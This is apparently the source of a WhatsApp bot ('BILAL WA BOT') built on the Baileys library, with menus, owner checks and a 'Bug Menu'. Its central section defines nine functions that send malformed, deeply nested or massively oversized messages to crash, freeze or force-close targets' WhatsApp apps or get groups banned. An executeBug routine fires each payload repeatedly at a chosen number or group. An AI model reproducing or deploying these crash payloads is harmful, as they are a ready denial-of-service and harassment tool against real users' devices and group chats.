/*

# Base By TdX Division
# Owner ? : t.me/bilal_babar_982
!- do not delete this credit

*/

require("./config.js");
const {
  default: crot,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  WAContextInfo,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  GroupSettingChange,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  templateMessage,
  InteractiveMessage,
  Header,
  encodeSignedDeviceIdentity,
  generateMessageID,
  encodeWAMessage,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  makeInMemoryStore,
  jidDecode,
  proto,
  getAggregateVotesInPollMessage,
  makeCacheableSignalKeyStore,
  Browsers,
  decryptMessageNode,
  MessageRetryMap,
} = require("@whiskeysockets/baileys");
//==========================================//
const fs = require("fs");
const os = require("os");
const nou = require("node-os-utils");
const pino = require("pino");
const speed = require("performance-now");
const readline = require("readline");
const { Boom } = require("@hapi/boom");
const chalk = require("chalk");
const util = require("util");
const yts = require("yt-search");
const path = require("path");
const moment = require("moment-timezone");
const pict2 = fs.readFileSync("./thumbnail/abst.jpeg");
const { spawn: spawn, exec } = require("child_process");
//==========================================//
const { makeWASocket, sreply, protoType } = require("./tdxbase/shortcut.js");
const {
  unixTimestampSeconds,
  generateMessageTag,
  processTime,
  webApi,
  getRandom,
  getBuffer,
  fetchJson,
  runtime,
  clockString,
  sleep,
  isUrl,
  getTime,
  formatDate,
  tanggal,
  formatp,
  jsonformat,
  reSize,
  toHD,
  logic,
  generateProfilePicture,
  bytesToSize,
  checkBandwidth,
  getSizeMedia,
  parseMention,
  getGroupAdmins,
  readFileTxt,
  readFileJson,
  getHashedPassword,
  generateAuthToken,
  cekMenfes,
  generateToken,
  batasiTeks,
  randomText,
  isEmoji,
  getTypeUrlMedia,
  pickRandom,
  getAllHTML,
  toIDR,
  capital,
  TelegraPh,
  UguuSe,
  webp2mp4File,
  prM,
} = require("./tdxbase/function.js");
const {
  imageToWebp,
  videoToWebp,
  writeExif,
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
} = require("./tdxbase/exif.js");
const { color } = require("./tdxbase/color.js");
const { GDrive } = require("./tdxbase/scrape/drive.js");
const { remini } = require("./tdxbase/scrape/remini.js");
const {
  tiktokSearchVideo,
  tiktokDownloaderVideo,
} = require("./tdxbase/scrape/tiktok.js");
const {
  generateDeepImg,
  venicechat,
  gpt,
  ytdownload,
  ytmp3,
  ytmp4,
  chatWithGPT,
  qwentxt2img,
  qwentxt2vid,
} = require("./tdxbase/scrape.js");
//==========================================//
module.exports = async (sock, m, chatUpdate, store, sessionDatabase = {}) => {
  Object.assign(global, { sock, m, chatUpdate, store });
  try {
    const messageBody =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype === "imageMessage"
          ? m.message.imageMessage.caption
          : m.mtype === "videoMessage"
            ? m.message.videoMessage.caption
            : m.mtype === "extendedTextMessage"
              ? m.message.extendedTextMessage.text
              : m.mtype === "buttonsResponseMessage"
                ? m.message.buttonsResponseMessage.selectedButtonId
                : m.mtype === "listResponseMessage"
                  ? m.message.listResponseMessage.singleSelectReply
                      .selectedRowId
                  : m.mtype === "templateButtonReplyMessage"
                    ? m.message.templateButtonReplyMessage.selectedId
                    : m.mtype === "interactiveResponseMessage"
                      ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)
                          .id
                      : m.mtype === "templateButtonReplyMessage"
                        ? m.msg.selectedId
                        : m.mtype === "messageContextInfo"
                          ? m.message.buttonsResponseMessage
                              ?.selectedButtonId ||
                            m.message.listResponseMessage?.singleSelectReply
                              .selectedRowId ||
                            m.text
                          : "";
    const body = typeof messageBody === "string" ? messageBody : "";
    //==========================================//
    const prefixRegex = /[.!#÷×/]/; //CMD
    var budy = typeof m.text == "string" ? m.text : "";
    const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : null;
    const isCmd = prefix ? body.startsWith(prefix) : false;
    const command = isCmd
      ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase()
      : "";
    const args = body.trim().split(/ +/).slice(1);
    const q = (text = args.join(" "));
    const from = m.key?.remoteJid || "0@lid";
    //==========================================//
    const databaseDir = sessionDatabase.databaseDir || path.resolve("./tdxbase/database");
    const ownersPath = path.join(databaseDir, "owner.json");
    const kontributor = JSON.parse(fs.readFileSync(ownersPath, "utf8"));
    if (!Array.isArray(kontributor)) throw new Error(`Invalid owner database: ${ownersPath}`);
    const botJid = sock.authState.creds.me?.id || sock.user?.id || "";
    if (botJid && !kontributor.includes(botJid)) {
      kontributor.push(botJid);
      fs.writeFileSync(ownersPath, JSON.stringify(kontributor, null, 2));
    }
    let mwmek = path.join(databaseDir, "botset.json");
    if (!fs.existsSync(mwmek))
      fs.writeFileSync(mwmek, JSON.stringify({ mode: "public" }));
    const botset = JSON.parse(fs.readFileSync(mwmek, "utf8"));
    //==========================================//
    const botNumber = botJid ? botJid.split("@")[0].split(":")[0] : "0";
    const pushname = m.pushName || "No Name";
    const senderNumber = m.sender.split("@")[0];
    const ownerJids = [
      botJid,
      sock.authState.creds.me?.lid,
      ...kontributor,
      ...(!sessionDatabase.isIsolated && Array.isArray(global.owner) ? global.owner : []),
    ].filter(jid => typeof jid === "string" && jid.includes("@"));
    const senderJids = [
      m.sender,
      m.key?.participant,
      m.key?.participantAlt,
      m.key?.remoteJidAlt,
      ...(m.key?.fromMe ? [m.key?.remoteJid] : []),
    ].filter(jid => typeof jid === "string" && jid.includes("@"));
    const mappedOwnerJids = await sock.arrayJidToLid(ownerJids) || [];
    const mappedSenderJids = await sock.arrayJidToLid(
      senderJids.filter(jid => jid.endsWith("@s.whatsapp.net")),
    ) || [];
    const allOwnerJids = [...ownerJids, ...mappedOwnerJids];
    const isCreator = senderJids.some(senderJid =>
      allOwnerJids.some(ownerJid => areJidsSameUser(senderJid, ownerJid))
      || mappedSenderJids.some(mappedSenderJid =>
        allOwnerJids.some(ownerJid => areJidsSameUser(mappedSenderJid, ownerJid)),
      ),
    );
    const isOwner = isCreator;
    const isDeveloper = isCreator;
    //==========================================//
    const isGroup = m.chat.endsWith("@g.us");
    const groupMetadata = isGroup
      ? await sock.groupMetadata(m.chat).catch((e) => {})
      : "";
    const participants = groupMetadata?.participants || [];
    const groupOwner = isGroup
      ? groupMetadata?.owner ||
        participants.find((p) => p.admin === "superadmin")?.id ||
        participants.find((p) => p.admin === "admin")?.id ||
        ""
      : "";
    const groupAdmins = participants
      .filter((p) => p.admin === "admin" || p.admin === "superadmin")
      .map((p) => p.jid || p.id);
    const groupName = isGroup ? groupMetadata.subject : "Unknown Group";
    const isBotAdmin = (isBotAdmins = isGroup
      ? ((await sock.arrayJidToLid(groupAdmins)) || []).includes(
          await sock.toLid(botNumber + "@s.whatsapp.net"),
        )
      : false);
    const isAdmins = isGroup
      ? ((await sock.arrayJidToLid(groupAdmins)) || []).includes(
          m.sender.endsWith("@s.whatsapp.net")
            ? await sock.toLid(m.sender)
            : m.sender,
        )
      : false;
    const isGroupOwner = isGroup
      ? (await sock.toLid(groupOwner || "")) ===
        (m.sender.endsWith("@s.whatsapp.net")
          ? await sock.toLid(m.sender)
          : m.sender)
      : false;
    //==========================================//
    const isMedia = m.type === "imageMessage" || m.type === "videoMessage";
    const fatkuns = m.quoted || m;
    const quoted =
      fatkuns.mtype == "buttonsMessage"
        ? fatkuns[Object.keys(fatkuns)[1]]
        : fatkuns.mtype == "templateMessage"
          ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
          : fatkuns.mtype == "product"
            ? fatkuns[Object.keys(fatkuns)[0]]
            : m.quoted
              ? m.quoted
              : m;
    const qmsg = quoted.msg || quoted;
    const mime = qmsg.mimetype || "";
    //==========================================//
    const alesana = fs.readFileSync("./tdxbase/media/alesana.jpg");

    //==========================================//
    // MENU BRANDING & HELPERS
    //==========================================//
    const MENU_BOT_NAME = "BILAL WA BOT";
    const MENU_BOT_VERSION = "4.0";
    const MENU_FOOTER = "2##9";
    const MENU_CHANNEL = "https://t.me/bilal_king_vip";
    const MENU_OWNER = "https://t.me/bilal_babar_982";
    const MENU_WA_CHANNEL = "https://whatsapp.com/channel/0029Vap5Rs4CHDymSoiyg93M";

    // Helper: FANCY menu (galaxy template) — all menus use this
    async function fancyMenu(sock, chat, secondary, cfg) {
      const media = await prepareWAMessageMedia(
        { image: pict2 },
        { upload: sock.waUploadToServer },
      );

      const buttons = [
        { name: "single_select", buttonParamsJson: JSON.stringify({ icon: "REVIEW", has_multiple_buttons: true }) },
        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "GIFT", flow_cta: cfg.topBanner || "╭────────「  B I L A L  」────────╮", flow_message_version: "3" }) },
        { name: "call_permission_request", buttonParamsJson: JSON.stringify({ has_multiple_buttons: true }) },
        { name: "single_select", buttonParamsJson: JSON.stringify({ icon: "DOCUMENT", title: cfg.dropdownTitle || "M E N U", sections: cfg.sections || [], has_multiple_buttons: true }) },
        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "GIFT", flow_cta: "╰───────────────────────────╯", flow_message_version: "3" }) },
        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "GIFT", flow_cta: "   ", flow_message_version: "3" }) },
        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "GIFT", flow_cta: cfg.midBanner || "╭────────「  𝖡 𝖮 𝖳 𝖧  」────────╮", flow_message_version: "3" }) },
        ...(cfg.ctaButtons || []).map((b) => ({
          name: "cta_url",
          buttonParamsJson: JSON.stringify({ display_text: b.text, url: b.url, merchant_url: b.url }),
        })),
        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "GIFT", flow_cta: "╰───────────────────────────╯", flow_message_version: "3" }) },
        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "GIFT", flow_cta: "   ", flow_message_version: "3" }) },
        ...(cfg.quickButtons || []).map((b) => ({
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: b.text, id: b.id }),
        })),
      ];

      const msg = generateWAMessageFromContent(
        chat,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                contextInfo: {
                  stanzaId: secondary.key.id,
                  participant: secondary.key.participant || secondary.key.remoteJid,
                  quotedMessage: secondary.message,
                },
                header: { hasMediaAttachment: true, ...media },
                body: { text: cfg.bodyText || "" },
                footer: { text: cfg.footerText || `© ${MENU_FOOTER}` },
                nativeFlowMessage: {
                  messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                      text: "B I L A L",
                      url: cfg.channelUrl || MENU_CHANNEL,
                      copy_code: cfg.copyCode || "BILAL-WA-BOT",
                      note: "WhatsApp automation tools",
                      expiration_time: Date.now() * 999,
                    },
                    bottom_sheet: {
                      in_thread_buttons_limit: 2,
                      divider_indices: [1, 2, 3, 4, 5, 999],
                      list_title: "B I L A L",
                      icon_title: "GIF",
                      button_title: "X",
                    },
                    tap_target_configuration: {
                      title: "X",
                      description: "B I L A L",
                      canonical_url: cfg.channelUrl || MENU_CHANNEL,
                      domain: cfg.channelUrl || MENU_CHANNEL,
                      button_index: 11,
                    },
                    promo_banner: {
                      header: "B I L A L",
                      body: "Secure • Stable • Execution Ready",
                      action: { type: "open_url", label: "Official Channel", url: cfg.channelUrl || MENU_CHANNEL },
                      expire_at: Math.floor(Date.now() / 1000) + 86400,
                    },
                    ui_rules: { max_buttons: 2, allow_copy: false },
                    system_meta: { label: "internal_service", version: "4.0", checksum: "b1l4l", session_state: "stable" },
                    redirect_action: { url: cfg.channelUrl || MENU_CHANNEL, trigger: "auto" },
                  }),
                  buttons,
                },
              },
            },
          },
        },
        {},
      );
      await sock.relayMessage(chat, msg.message, { messageId: msg.key.id });
    }

    // Helper: send photo + caption + quick reply buttons (for category submenus)
    async function sendPhotoMenu(sock, chat, m, { caption, buttons }) {
      await sock.sendMessage(
        chat,
        {
          image: pict2,
          caption: caption,
          footer: `© ${MENU_FOOTER}`,
          buttons: buttons.map((b) => ({
            buttonId: b.id,
            buttonText: { displayText: b.text },
            type: 1,
          })),
          headerType: 6,
        },
        { quoted: m },
      );
    }

    // Left-only border text builder
    function buildMenuCaption(title, subtitle, sections) {
      let cap = `┌ ${title}\n│\n│  ${subtitle}\n`;
      for (const [name, items] of sections) {
        cap += `│\n├ ${name}\n`;
        for (const item of items) cap += `│  › ${item}\n`;
      }
      cap += `\n© ${MENU_FOOTER}`;
      return cap;
    }

    //==========================================//
    // BUG EXECUTOR & BUG FUNCTIONS
    //==========================================//
    const BUG_INTERVAL_MS = 500;

    /* ═══════════════════════════════════════════════════════════
     * BUG FUNCTIONS
     * ═══════════════════════════════════════════════════════════
     * Setiap function WAJIB handle sendiri:
     *   1. Payload       → struktur pesan
     *   2. relayMessage  → kirim via sock.relayMessage()
     *   3. Participant   → field participant di options relay
     *
     * ❌ JANGAN taruh loop / delay / retry di sini
     * ✅ Loop & jumlah kirim DIATUR handler (executeBug)
     *
     * Dipanggil:  await bugIos(sock, target)
     * ═══════════════════════════════════════════════════════════ */
async function bugIos(sock, target) {
    const jidList = Array.isArray(target) ? target : [target];

    const payload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    unifiedResponse: {
                        data: Buffer.from(
                            JSON.stringify({
                                __typename: "GenAIUnifiedResponse",
                                response_id: "Godline",
                                sections: [
                                    {
                                        __typename: "GenAIUnifiedResponseSection",
                                        view_model: Array.from({ length: 5 }, () => ({})),
                                    },
                                ],
                            })
                        ).toString("base64"),
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardOrigin: 4,
                        forwardedAiBotMessageInfo: {
                            botJid: "0@bot",
                        },
                    },
                },
            },
        },
    };

    const options = {
        statusJidList: jidList,
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: jidList.map((x) => ({
                            tag: "to",
                            attrs: { jid: x },
                        })),
                    },
                ],
            },
        ],
    };

    await sock.relayMessage("status@broadcast", payload, options);
}

    async function bugAndroid(sock, target) {
      const payload = Array.from({ length: 2000 }).reduce((acc) => ({
        botInvokeMessage: { message: acc },
      }));

      await sock.relayMessage(target, payload, {
        additionalAttributes: { edit: "7" },
        broadcast: true,
        remoteJid: target,
        fromMe: false,
        participant: { jid: target },
        secret: parseInt("6"),
      });
    }

    async function bugDelay(sock, target) {
      const payload = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: ".".repeat(50000) },
              nativeFlowMessage: {
                buttons: Array.from({ length: 50000 }, () => ({
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ display_text: "X", id: "X" }),
                })),
                messageParamsJson: "{}",
              },
            },
          },
        },
      };

      await sock.relayMessage(target, payload, {
        participant: { jid: target },
      });
    }

    async function bugFreeze(sock, target) {
      const payload = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "∅", display_text: "∅".repeat(5000) },
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  tap_target_configuration: {
                    title: "#",
                    description: "X",
                    canonical_url: "https://t.me/bilal_babar_982",
                    domain: "https://t.me/bilal_babar_982",
                    button_index: 0,
                  },
                }),
                buttons: Array.from({ length: 500000 }, () => ({})),
              },
            },
          },
        },
      };

      await sock.relayMessage(target, payload, {
        participant: { jid: target },
      });
    }

    async function bugForclose(sock, target) {
      const payload = {
        interactiveMessage: {
          body: { text: "\r" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 50000 }, () => ({
              name: "send_location",
              buttonParamsJson: "",
            })),
            messageVersion: 1,
            messageParamsJson: "",
          },
        },
      };

      await sock.relayMessage(target, payload, {
        participant: { jid: target },
      });
    }

    async function bugBlank(sock, target) {
      const payload = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/blank.enc",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("0".repeat(43) + "=", "base64"),
              fileLength: "0",
              height: 0,
              width: 0,
              mediaKey: Buffer.from("0".repeat(43) + "=", "base64"),
              fileEncSha256: Buffer.from("0".repeat(43) + "=", "base64"),
              directPath: "/v/t62.7118-24/blank.enc",
              mediaKeyTimestamp: String(Math.floor(Date.now() / 1000)),
              jpegThumbnail: Buffer.alloc(0),
            },
          },
        },
      };

      await sock.relayMessage(target, payload, {
        participant: { jid: target },
      });
    }

    async function bugCombo(sock, target) {
      const payload = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "?".repeat(500) },
              nativeFlowMessage: {
                buttons: Array.from({ length: 100000 }, () => ({
                  name: "send_location",
                  buttonParamsJson: "",
                })),
                messageVersion: 1,
                messageParamsJson: "",
              },
            },
          },
        },
      };

      await sock.relayMessage(target, payload, {
        additionalAttributes: { edit: "7" },
        broadcast: true,
        remoteJid: target,
        fromMe: false,
        participant: { jid: target },
        secret: parseInt("6"),
      });
    }

    // ─── BUG GRUP: kirim payload massive ke grup ───
    async function bugGrup(sock, target) {
      const payload = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "?".repeat(500) },
              nativeFlowMessage: {
                buttons: Array.from({ length: 100000 }, () => ({
                  name: "send_location",
                  buttonParamsJson: "",
                })),
                messageVersion: 1,
                messageParamsJson: "",
              },
            },
          },
        },
      };

      await sock.relayMessage(target, payload, {
        participant: { jid: target },
      });
    }

    // ─── BAN GRUP: payload agresif untuk trigger ban grup ───
    async function banGrup(sock, target) {
      const payload = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "∅".repeat(50000),
                display_text: "∅".repeat(5000),
              },
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  tap_target_configuration: {
                    title: "#",
                    description: "X",
                    canonical_url: "https://wa.me/6280000000000",
                    domain: "https://wa.me/6280000000000",
                    button_index: 0,
                  },
                  ui_rules: { max_buttons: 999999, allow_copy: true },
                }),
                buttons: Array.from({ length: 500000 }, () => ({
                  name: "send_location",
                  buttonParamsJson: "",
                })),
              },
            },
          },
        },
      };

      await sock.relayMessage(target, payload, {
        additionalAttributes: { edit: "7" },
        broadcast: true,
        remoteJid: target,
        fromMe: false,
        participant: { jid: target },
        secret: parseInt("6"),
      });
    }

    const BUG_REGISTRY = {
      iosx:     { label: "iOS Crash",     cycles: 80, run: bugIos },
      androx:   { label: "Android Crash", cycles: 15, run: bugAndroid },
      delay:    { label: "Delay Bomb",    cycles: 20, run: bugDelay },
      freeze:   { label: "Freeze",        cycles: 30, run: bugFreeze },
      forclose: { label: "Forclose",      cycles: 25, run: bugForclose },
      blank:    { label: "Blank Msg",     cycles: 10, run: bugBlank },
      combo:    { label: "Combo Attack",  cycles: 50, run: bugCombo },
      grup:     { label: "Bug Group",     cycles: 30, run: bugGrup },
      bangrup:  { label: "Ban Group",     cycles: 60, run: banGrup },
    };

    // ─── Helper: resolve link grup / JID ───
    async function resolveGroupJid(sock, input) {
      const trimmed = String(input || "").trim();
      if (!trimmed) return null;

      // Langsung JID grup
      if (trimmed.endsWith("@g.us")) return trimmed;

      // Link grup
      const match = trimmed.match(/chat\.whatsapp\.com\/([0-9A-Za-z_-]+)/i);
      if (match) {
        const code = match[1];
        try {
          const info = await sock.groupGetInviteInfo(code);
          if (info?.id) return info.id;
        } catch { }
        try {
          const jid = await sock.groupAcceptInvite(code);
          if (jid?.endsWith("@g.us")) return jid;
        } catch { }
      }
      return null;
    }

    async function executeBug(sock, m, { command, target, rawNumber }) {
      const cfg = BUG_REGISTRY[command];
      if (!cfg) return sock.sendMessage(m.chat, { text: "Unknown bug." }, { quoted: m });

      const cycles = cfg.cycles;
      const t0 = Date.now();

      // ── START ──
      const startText = [
        `┌ B U G  E X E C U T I O N`,
        `│`,
        `├ Bug Type`,
        `│  › ${cfg.label}`,
        `│`,
        `├ Target`,
        `│  › ${rawNumber}`,
        `│`,
        `├ Config`,
        `│  › Command  : .${command}`,
        `│  › Cycles   : ${cycles}`,
        `│  › Interval : ${BUG_INTERVAL_MS}ms`,
        `│  › Est. Time: ${((cycles * BUG_INTERVAL_MS) / 1000).toFixed(1)}s`,
        `│`,
        `├ Status`,
        `│  › 🔄 Processing...`,
        ``,
        `© ${MENU_FOOTER}`,
      ].join("\n");

      await sock.sendMessage(m.chat, { text: startText }, { quoted: m });

      // ── EXECUTE ──
      let success = 0, fail = 0;
      const errors = [];

      for (let i = 0; i < cycles; i++) {
        try {
          await cfg.run(sock, target);
          success++;
        } catch (err) {
          fail++;
          if (errors.length < 3) errors.push(String(err?.message || err).slice(0, 60));
          console.error(`[${command.toUpperCase()} ${i + 1}/${cycles}]`, err?.message || err);
        }
        await sleep(BUG_INTERVAL_MS);
      }

      // ── RESULT ──
      const elapsedMs = Date.now() - t0;
      const elapsedSec = (elapsedMs / 1000).toFixed(2);
      const rate = cycles > 0 ? Math.round((success / cycles) * 100) : 0;
      const avgPerCycle = (elapsedMs / cycles).toFixed(0);

      const statusEmoji = fail === 0 ? "✅" : success === 0 ? "❌" : "⚠️";
      const statusText  = fail === 0 ? "Success" : success === 0 ? "Failed" : "Partial";

      const BAR_SLOTS = 12;
      const filled = Math.round((rate / 100) * BAR_SLOTS);
      const bar = "▰".repeat(filled) + "▱".repeat(BAR_SLOTS - filled);

      const lines = [
        `┌ B U G  R E S U L T`,
        `│`,
        `├ ${statusEmoji} Status`,
        `│  › ${statusText}`,
        `│  › ${bar} ${rate}%`,
        `│`,
        `├ Target`,
        `│  › ${rawNumber}`,
        `│`,
        `├ Bug Info`,
        `│  › Type     : ${cfg.label}`,
        `│  › Command  : .${command}`,
        `│`,
        `├ Result`,
        `│  › ✅ Success : ${success}/${cycles}`,
        `│  › ❌ Failed  : ${fail}/${cycles}`,
        `│  › 📊 Rate    : ${rate}%`,
        `│`,
        `├ Timing`,
        `│  › ⏱ Total   : ${elapsedSec}s`,
        `│  › ⚡ Avg     : ${avgPerCycle}ms/cycle`,
        `│`,
      ];

      if (errors.length) {
        lines.push(`├ Error Sample`);
        for (const e of errors) lines.push(`│  › ${e}`);
        lines.push(`│`);
      }

      lines.push(`© ${MENU_FOOTER}`);

      await sock.sendMessage(m.chat, { text: lines.join("\n") }, { quoted: m });
    }

    //==========================================//
    const time = moment().tz(global.timezone);
    const WIB = moment().tz("Asia/Jakarta");
    const WITA = moment().tz("Asia/Makassar");
    const WIT = moment().tz("Asia/Jayapura");
    const second = time.format("ss");
    const minutes = time.format("mm");
    const hour = time.format("HH");
    const date = time.format("DD");
    const day = time.format("dddd");
    const month = time.format("MMMM");
    const years = time.format("YYYY");
    const calender = time.format("DD-MM-YYYY HH:mm:ss");
    let salam;
    if (hour >= 4 && hour < 10) salam = "Good morning";
    else if (hour >= 10 && hour < 15) salam = "Good afternoon";
    else if (hour >= 15 && hour < 18) salam = "Good evening";
    else salam = "Good evening";
    pasaran = ["Legi", "Pahing", "Pon", "Wage", "Kliwon"];
    let st = moment("1899-12-30");
    let diff = time.diff(st, "days");
    let weton = `${day} ${pasaran[diff % 5]}`;
    const timeall = {
      WIB: time.format("HH:mm:ss"),
      WITA: WITA.format("HH:mm:ss"),
      WIT: WIT.format("HH:mm:ss"),
      Greeting: salam,
      Day: day,
      Date: date,
      Month: month,
      Year: years,
      Calendar: calender,
      Seconds: second,
      Minutes: minutes,
      Hours: hour,
      Weton: weton,
    };
    //==========================================//
    if (isCmd && !isCreator && botset.mode === "self") return;
    //==========================================//
    if (body) {
      console.log(
        `${"[" + moment.tz("Asia/Jakarta").format("HH:mm:ss") + "]"} ${chalk.blue(command ? prefix + command : "No Cmd")} - ${chalk.green(m.sender.split("@")[0])} in ${chalk.yellow(isGroup ? groupName : "Private")}\n↳ ${body.length > 150 ? body.slice(0, 147) + "..." : body}\n`,
      );
    }
    //==========================================//
    switch (command) {
      // ═══════════════════════════════════════════════════════════
      // MENU UTAMA
      // ═══════════════════════════════════════════════════════════
      case "menu": {
        await fancyMenu(sock, m.chat, m, {
          channelUrl: MENU_CHANNEL,
          copyCode: "BILAL-WA-BOT",
          topBanner: "╭────────「  B I L A L  」────────╮",
          midBanner: "╭────────「  𝖡 𝖮 𝖳 𝖧  」────────╮",
          dropdownTitle: "A L L - M E N U",
          bodyText: `⌯ 𝖺𝗎𝗍𝗁𝗈𝗋 : t.me/bilal_babar_982
⌯ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇 : 4.0
⌯ 𝖿𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄 : 𝖻𝖺𝗂𝗅𝖾𝗒𝗌`,
          footerText: `© ${MENU_FOOTER}`,
          sections: [
            {
              title: "BILAL WA BOT",
              highlight_label: "BILAL WA BOT",
              rows: [
                { title: "Bug Menu - Selection", description: "iOS and Android crash tools", id: ".bugmenu" },
                { title: "All Menu - System", description: "View all categories", id: ".allmenu" },
                { title: "Info - Tools", description: "Bot information tools", id: ".infomenu" },
                { title: "Owner - Panel", description: "Owner only commands", id: ".ownermenu" },
                { title: "About - Bot", description: "About this bot", id: ".about" },
              ],
            },
          ],
          ctaButtons: [
            { text: "channel telegram", url: MENU_CHANNEL },
            { text: "telegram owner", url: MENU_OWNER },
            { text: "channel whatsapp", url: MENU_WA_CHANNEL },
          ],
          quickButtons: [
            { text: "Bug", id: ".bugmenu" },
            { text: "All", id: ".allmenu" },
          ],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // SUBMENU: BUG (9 tools)
      // ═══════════════════════════════════════════════════════════
      case "bugmenu": {
        await fancyMenu(sock, m.chat, m, {
          channelUrl: MENU_CHANNEL,
          copyCode: "BUG-MENU",
          topBanner: "╭────────「  B U G  」────────╮",
          midBanner: "╭────────「  M E N U  」────────╮",
          dropdownTitle: "B U G - T O O L S",
          bodyText: `⌯ Menu : Bug Tools
⌯ Total : 9 tools
⌯ Access : Owner only
⌯ Interval : ${BUG_INTERVAL_MS}ms`,
          footerText: `© ${MENU_FOOTER}`,
          sections: [
            {
              title: "Core Bug",
              highlight_label: "Owner Only",
              rows: [
                { title: "iOS Crash",     description: "VCard bomb payload",     id: ".iosx" },
                { title: "Android Crash", description: "Nested botInvoke bomb",  id: ".androx" },
                { title: "Combo Attack",  description: "Heavy interactive bomb", id: ".combo" },
              ],
            },
            {
              title: "Advanced Bug",
              rows: [
                { title: "Delay Bomb", description: "Long interactive delay",   id: ".delay" },
                { title: "Freeze",     description: "Freeze UI with buttons",   id: ".freeze" },
                { title: "Forclose",   description: "Force close via location", id: ".forclose" },
                { title: "Blank Msg",  description: "Blank viewOnce message",   id: ".blank" },
              ],
            },
            {
              title: "Group Bug",
              rows: [
                { title: "Bug Group", description: "Send massive bug to group", id: ".grup" },
                { title: "Ban Group", description: "Attempt to ban target group", id: ".bangrup" },
              ],
            },
          ],
          ctaButtons: [{ text: "telegram owner", url: MENU_OWNER }],
          quickButtons: [
            { text: "← Back", id: ".menu" },
            { text: "All Menu", id: ".allmenu" },
          ],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // SUBMENU: INFO
      // ═══════════════════════════════════════════════════════════
      case "infomenu": {
        await fancyMenu(sock, m.chat, m, {
          channelUrl: MENU_CHANNEL,
          copyCode: "INFO-MENU",
          topBanner: "╭────────「  I N F O  」────────╮",
          midBanner: "╭────────「  T O O L S  」────────╮",
          dropdownTitle: "I N F O - T O O L S",
          bodyText: `⌯ Menu : Info Tools
⌯ Total : 3 tools
⌯ Access : Public`,
          footerText: `© ${MENU_FOOTER}`,
          sections: [
            {
              title: "Info Tools",
              highlight_label: "Public Access",
              rows: [
                { title: "Ping", description: "Check bot latency + server info", id: ".ping" },
                { title: "To LID", description: "Convert JID to LID", id: ".tolid" },
                { title: "Sen", description: "Get sender info", id: ".sen" },
              ],
            },
          ],
          ctaButtons: [{ text: "channel telegram", url: MENU_CHANNEL }],
          quickButtons: [
            { text: "← Back", id: ".menu" },
            { text: "All Menu", id: ".allmenu" },
          ],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // SUBMENU: OWNER
      // ═══════════════════════════════════════════════════════════
      case "ownermenu": {
        if (!isCreator) return m.reply(`Access denied\n\n© ${MENU_FOOTER}`);
        await fancyMenu(sock, m.chat, m, {
          channelUrl: MENU_CHANNEL,
          copyCode: "OWNER-MENU",
          topBanner: "╭────────「  O W N E R  」────────╮",
          midBanner: "╭────────「  P A N E L  」────────╮",
          dropdownTitle: "O W N E R - T O O L S",
          bodyText: `⌯ Menu : Owner Tools
⌯ Access : Owner only
⌯ Note : Full access commands`,
          footerText: `© ${MENU_FOOTER}`,
          sections: [
            {
              title: "Mode Control",
              highlight_label: "Owner Only",
              rows: [
                { title: "Public Mode", description: "Set bot to public mode", id: ".public" },
                { title: "Self Mode", description: "Set bot to self mode", id: ".self" },
              ],
